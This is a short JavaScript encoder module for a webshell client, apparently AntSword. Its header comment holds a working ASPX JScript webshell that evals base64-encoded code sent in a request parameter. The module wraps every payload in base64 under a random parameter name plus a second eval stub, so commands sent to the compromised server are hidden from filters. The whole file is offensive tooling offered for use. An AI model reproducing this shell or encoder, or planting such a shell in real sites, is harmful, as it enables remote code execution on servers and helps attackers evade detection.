/**
 * aspx::b64pass编码器
 * Create at: 2019/04/02 14:57:49
 * 把所有 POST 参数都进行了 base64 编码
 */
/**
* 适用shell:

<%@ Page Language="Jscript"%>
<% eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["ant"])),"unsafe"); %>
 */

'use strict';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data) => {
  // ##########    请在下方编写你自己的代码   ###################

  // 生成一个随机变量名
  let randomID = `_0x${Math.random().toString(16).substr(2)}`;
  // 原有的 payload 在 data['_']中
  data[randomID] = Buffer.from(data['_']).toString('base64');

  // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
  data[pwd] = Buffer.from(`eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${randomID}"])),"unsafe");`).toString('base64');

  // ##########    请在上方编写你自己的代码   ###################

  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}